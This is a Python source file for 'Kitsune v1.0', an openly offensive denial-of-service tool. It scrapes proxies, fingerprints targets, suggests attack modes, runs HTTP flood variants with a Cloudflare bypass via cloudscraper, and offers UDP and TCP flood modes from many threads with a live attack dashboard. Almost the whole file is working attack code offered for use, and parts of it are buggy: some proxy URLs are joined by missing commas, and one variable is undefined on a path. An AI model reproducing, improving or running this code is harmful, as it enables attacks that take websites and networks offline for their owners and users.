# Kitsune v1.0 - Firepower Edition
# Developed By: ALTAIR
import threading
import asyncio
import aiohttp
import random
import time
import os
import socket
import requests
from rich.console import Console
from rich.live import Live
from rich.table import Table
from rich.panel import Panel
from colorama import Fore, Style, init
from aiohttp_socks import ProxyConnector
from cloudscraper import create_scraper

# Initialize colorama
init(autoreset=True)

# Load user agents
def load_user_agents():
    with open('useragents.txt', 'r') as f:
        return [line.strip() for line in f if line.strip()]

# Proxy Scraper 
def scrape_proxies():
    proxy_sources = [
        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=1000&country=all&ssl=all&anonymity=all",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt"
        "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt"
        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt"
    ]
    proxies = set()
    print(f"{Fore.YELLOW}[!] Scraping fresh proxies...")
    for url in proxy_sources:
        try:
            r = requests.get(url, timeout=10)
            for line in r.text.splitlines():
                proxy = line.strip()
                if proxy:
                    proxies.add(proxy)
        except Exception as e:
            print(f"{Fore.RED}[!] Failed scraping {url}: {e}")
    print(f"{Fore.GREEN}[+] Scraped {len(proxies)} proxies!\n")
    return list(proxies)

# Analyze target info
def analyze_target(url):
    print(f"{Fore.CYAN}[i] Analyzing target...")
    info = {
        "server": "Unknown",
        "powered_by": "Unknown",
        "cloudflare": False,
        "content_type": "Unknown",
        "content_length": 0,
        "connection": "Unknown"
    }
    try:
        response = requests.get(url, timeout=10)
        info["server"] = response.headers.get('Server', 'Unknown')
        info["powered_by"] = response.headers.get('X-Powered-By', 'Unknown')
        info["content_type"] = response.headers.get('Content-Type', 'Unknown')
        info["content_length"] = int(response.headers.get('Content-Length', 0) or 0)
        info["connection"] = response.headers.get('Connection', 'Unknown')
        info["cloudflare"] = 'cloudflare' in (info["server"].lower() + info["powered_by"].lower())

        print(f"{Fore.LIGHTMAGENTA_EX}[~] Status Code: {response.status_code}")
        print(f"{Fore.LIGHTMAGENTA_EX}[~] Server: {info['server']}")
        print(f"{Fore.LIGHTMAGENTA_EX}[~] X-Powered-By: {info['powered_by']}")
        print(f"{Fore.LIGHTMAGENTA_EX}[~] Content-Type: {info['content_type']}")
        print(f"{Fore.LIGHTMAGENTA_EX}[~] Content-Length: {info['content_length']}")
        print(f"{Fore.LIGHTMAGENTA_EX}[~] Connection: {info['connection']}")
        print(f"{Fore.LIGHTMAGENTA_EX}[~] Behind Cloudflare: {'Yes' if info['cloudflare'] else 'No'}\n")
        if response.status_code != 200:
            print(f"{Fore.RED}[!] Warning: Target may be DOWN or BLOCKED!\n")
    except Exception as e:
        print(f"{Fore.RED}[!] Target analysis failed: {e}\n")
    return info

# Suggest attack modes
def suggest_attack_modes(info):
    suggestions = []

    if info.get('cloudflare'):
        suggestions.append("random-method")
    if 'html' in info.get('content_type', ''):
        suggestions.append("http-flood")
        suggestions.append("random-uri")
    if 'json' in info.get('content_type', ''):
        suggestions.append("post")
    if 'keep-alive' in info.get('connection', '').lower():
        suggestions.append("cookie")
    if info.get('content_length', 0) > 500000:
        suggestions.append("cache-bypass")

    return suggestions

# Global counters
counters = {
    "total": 0,
    "success": 0,
    "error": 0
}
lock = threading.Lock()

# Header Generator
def generate_headers(url, user_agents, mode="basic"):
    headers = {
        "User-Agent": random.choice(user_agents),
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.5",
        "Referer": url
    }
    if mode == "cookie":
        headers["Cookie"] = f"session={random.randint(100000, 999999)}"
    elif mode == "referer":
        headers["Referer"] = random.choice([
            "https://google.com", "https://bing.com", "https://pornhub.com",
            "https://facebook.com", "https://tiktok.com"
        ])
    elif mode == "cache":
        headers["Cache-Control"] = "no-cache"
    return headers

# Async attack
async def generic_attack(url, duration, user_agents, proxies, method="GET", uri_random=False, data=None, header_mode="basic", random_method=False):
    timeout = aiohttp.ClientTimeout(total=10)
    connector = aiohttp.TCPConnector(ssl=False)
    async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
        end_time = time.time() + duration
        while time.time() < end_time:
            try:
                path = f"?{random.randint(1, 999999)}" if uri_random else ""
                headers = generate_headers(url, user_agents, header_mode)
                proxy = f"http://{random.choice(proxies)}" if proxies else None
                use_method = method if not random_method else random.choice(["GET", "POST", "HEAD", "PUT", "DELETE", "OPTIONS"])
                
                async with session.request(
                    method=use_method,
                    url=url + path,
                    headers=headers,
                    proxy=proxy
                ) as response:
                    await response.read()
                
                with lock:
                    counters["total"] += 1
                    counters["success"] += 1
            except Exception:
                with lock:
                    counters["total"] += 1
                    counters["error"] += 1

# Cloudflare bypass
def cloudflare_bypass(url, duration):
    scraper = create_scraper()
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            scraper.get(url)
            with lock:
                counters["total"] += 1
                counters["success"] += 1
        except Exception:
            with lock:
                counters["total"] += 1
                counters["error"] += 1

def stats_dashboard(url, duration):
    start = time.time()
    end_time = start + duration
    prev_total = 0
    while time.time() < end_time:
        time.sleep(1)
        with lock:
            total = counters["total"]
            success = counters["success"]
            error = counters["error"]
        rps = total - prev_total
        prev_total = total

        os.system('cls' if os.name == 'nt' else 'clear')
        print(f"{Fore.MAGENTA}=== Kitsune v1.0 - Attack Dashboard ==={Style.RESET_ALL}")
        print(f"{Fore.LIGHTCYAN_EX}Target        : {url}")
        print(f"{Fore.LIGHTCYAN_EX}Time Left     : {int(end_time - time.time())}s")
        print(f"{Fore.LIGHTCYAN_EX}Total Requests: {total}")
        print(f"{Fore.LIGHTGREEN_EX}Successful    : {success}")
        print(f"{Fore.LIGHTRED_EX}Errors        : {error}")
        print(f"{Fore.LIGHTMAGENTA_EX}Current RPS   : {rps}\n")

# ======= Layer 4 Class =======

class Layer4Attack:
    def __init__(self, target_ip, target_port, duration, threads):
        self.target_ip = target_ip
        self.target_port = target_port
        self.duration = duration
        self.threads = threads
        self.end_time = time.time() + duration

    def udp_flood(self):
        while time.time() < self.end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                payload = random._urandom(random.randint(32, 1024))
                sock.sendto(payload, (self.target_ip, self.target_port))
                sock.close()
            except:
                pass

    def tcp_syn_flood(self):
        while time.time() < self.end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.01)
                sock.connect_ex((self.target_ip, self.target_port))
                sock.send(random._urandom(16))
                sock.close()
            except:
                pass

    def tcp_ack_flood(self):
        while time.time() < self.end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.01)
                sock.connect_ex((self.target_ip, self.target_port))
                sock.send(b'\x10\x02' + random._urandom(14))
                sock.close()
            except:
                pass

    def syn_spoof_flood(self):
        while time.time() < self.end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.01)
                sock.connect_ex((self.target_ip, self.target_port))
                sock.sendto(random._urandom(16), (self.target_ip, self.target_port))
                sock.close()
            except:
                pass

    def tcp_rst_flood(self):
        while time.time() < self.end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.01)
                sock.connect_ex((self.target_ip, self.target_port))
                sock.send(b'\x00\x02' + random._urandom(14))
                sock.close()
            except:
                pass

    def hybrid_l4_flood(self):
        while time.time() < self.end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.01)
                sock.connect_ex((self.target_ip, self.target_port))
                flags = random.choice([b'\x02', b'\x10', b'\x04', b'\x08', b'\x01'])
                sock.send(flags + random._urandom(15))
                sock.close()
            except:
                pass

    def start_attack(self, mode):
        attack_map = {
            "udp-flood": self.udp_flood,
            "tcp-syn-flood": self.tcp_syn_flood,
            "tcp-ack-flood": self.tcp_ack_flood,
            "syn-spoof": self.syn_spoof_flood,
            "tcp-rst-flood": self.tcp_rst_flood,
            "hybrid-l4": self.hybrid_l4_flood
        }
        attack_func = attack_map.get(mode)
        if not attack_func:
            print(f"{Fore.RED}[!] Invalid attack mode.")
            return
        threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=attack_func, daemon=True)
            t.start()
            threads.append(t)
        for t in threads:
            t.join()

# Main
async def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""
{Fore.MAGENTA}
██╗  ██╗██╗████████╗███████╗██╗   ██╗███╗   ██╗███████╗
██║ ██╔╝██║╚══██╔══╝██╔════╝██║   ██║████╗  ██║██╔════╝
█████╔╝ ██║   ██║   ███████╗██║   ██║██╔██╗ ██║█████╗  
██╔═██╗ ██║   ██║   ╚════██║██║   ██║██║╚██╗██║██╔══╝  
██║  ██╗██║   ██║   ███████║╚██████╔╝██║ ╚████║███████╗
╚═╝  ╚═╝╚═╝   ╚═╝   ╚══════╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝
                                                       
         Kitsune v1.0 - Firepower Edition
{Fore.LIGHTCYAN_EX}  Developed By: ALTAIR
{Style.RESET_ALL}
    """)
    print(f"{Fore.LIGHTGREEN_EX}Choose Layer: ")
    print(f"{Fore.YELLOW}1. Layer 7 (Website)")
    print(f"{Fore.YELLOW}2. Layer 4 (Network/IP)")
    layer_choice = int(input(f"{Fore.LIGHTGREEN_EX}Enter choice > "))

    if layer_choice == 1:
        url = input(f"{Fore.LIGHTGREEN_EX}Target URL > ")
        info = analyze_target(url)
        duration = int(input(f"{Fore.LIGHTGREEN_EX}Attack Duration (seconds) > "))
        threads = int(input(f"{Fore.LIGHTGREEN_EX}Threads > "))

        attack_modes = {
            "http-flood": {"method": "GET"},
            "random-uri": {"method": "GET", "uri_random": True},
            "head": {"method": "HEAD"},
            "post": {"method": "POST"},
            "random-method": {"random_method": True, "uri_random": True},
            "cookie": {"method": "GET", "header_mode": "cookie"},
            "referer": {"method": "GET", "header_mode": "referer"},
            "useragent": {"method": "GET"},
            "cache-bypass": {"method": "GET", "header_mode": "cache", "uri_random": True}
        }

        # Smart Suggestion
        suggested_modes = suggest_attack_modes(info)

        print(f"{Fore.LIGHTGREEN_EX}Select Attack Mode:")
        for i, mode in enumerate(attack_modes.keys(), 1):
            hint = f"[suggested]" if mode in suggested_modes else ""
            print(f"{Fore.YELLOW}{i}. {mode} {Fore.LIGHTMAGENTA_EX}{hint}")

        mode_choice = int(input(f"{Fore.LIGHTGREEN_EX}Enter choice > ")) - 1
        selected_mode = list(attack_modes.keys())[mode_choice]

        user_agents = load_user_agents()
        proxies = scrape_proxies()

        threading.Thread(target=stats_dashboard, args=(url, duration), daemon=True).start()

        if info['cloudflare']:
            threads_list = [threading.Thread(target=cloudflare_bypass, args=(url, duration), daemon=True) for _ in range(threads)]
            for t in threads_list: t.start()
            for t in threads_list: t.join()
        else:
            config = attack_modes[selected_mode]
            await asyncio.gather(*[generic_attack(url, duration, user_agents, proxies, **config) for _ in range(threads)])

        print(f"\n{Fore.GREEN}[+] Attack finished! Total: {counters['total']}, Success: {counters['success']}, Errors: {counters['error']}")

    elif layer_choice == 2:
        print(f"{Fore.LIGHTGREEN_EX}{'='*40}")
        print(f"{Fore.LIGHTGREEN_EX}        Layer 4 Attack Dashboard")
        print(f"{Fore.LIGHTGREEN_EX}{'='*40}")

        target_ip = input(f"{Fore.LIGHTGREEN_EX}Target IP > ")
        target_port = int(input(f"{Fore.LIGHTGREEN_EX}Target Port > "))
        duration = int(input(f"{Fore.LIGHTGREEN_EX}Attack Duration (seconds) > "))
        threads = int(input(f"{Fore.LIGHTGREEN_EX}Threads > "))

        print(f"{Fore.LIGHTGREEN_EX}Select Layer 4 Attack Mode:")
        print(f"{Fore.YELLOW}1. UDP Flood")
        print(f"{Fore.YELLOW}2. TCP SYN Flood")
        print(f"{Fore.YELLOW}3. TCP ACK Flood")
        print(f"{Fore.YELLOW}4. SYN Spoof")
        print(f"{Fore.YELLOW}5. TCP RST Flood")
        print(f"{Fore.YELLOW}6. Hybrid L4 Flood")
        mode_choice = int(input(f"{Fore.LIGHTGREEN_EX}Enter choice > "))

        mode_map = {
            1: "udp-flood",
            2: "tcp-syn-flood",
            3: "tcp-ack-flood",
            4: "syn-spoof",
            5: "tcp-rst-flood",
            6: "hybrid-l4"
        }


        mode = mode_map.get(mode_choice)

        
    if mode:
        # Dashboard summary
        print(f"\n{Fore.LIGHTCYAN_EX}{'-'*40}")
        print(f"{Fore.CYAN}Target IP      : {target_ip}")
        print(f"{Fore.CYAN}Target Port    : {target_port}")
        print(f"{Fore.CYAN}Duration       : {duration} seconds")
        print(f"{Fore.CYAN}Threads        : {threads}")
        print(f"{Fore.CYAN}Attack Mode    : {mode}")
        print(f"{Fore.LIGHTCYAN_EX}{'-'*40}")

        confirm = input(f"{Fore.LIGHTGREEN_EX}Confirm and launch attack? (Y/n) > ").strip().lower()
        if confirm == 'y' or confirm == '':
            attack = Layer4Attack(target_ip, target_port, duration, threads)
            attack.start_attack(mode)
        else:
            print(f"{Fore.LIGHTYELLOW_EX}Attack canceled by user.")
    else:
        print(f"{Fore.RED}[!] Invalid choice!")

# Run Main
if __name__ == "__main__":
    asyncio.run(main())
